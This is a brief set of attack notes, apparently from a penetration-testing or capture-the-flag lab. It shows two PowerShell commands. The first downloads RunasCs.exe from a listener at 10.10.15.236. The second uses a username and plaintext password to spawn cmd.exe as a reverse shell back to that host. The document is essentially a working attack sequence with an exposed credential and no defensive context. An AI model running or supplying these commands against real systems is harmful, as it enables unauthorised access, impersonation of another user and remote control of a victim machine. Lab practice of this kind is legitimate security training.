# Download
```powershell
iwr -uri http://10.10.15.236:8088/RunasCs.exe -OutFile RunasCs.exe
```

# Reverse Shell
```powershell
.\RunasCs.exe noah.b RiverDragon#Storm25 cmd.exe -r 10.10.15.236:4455
```
![](Attachments/Pasted%20image%2020260903101131.png)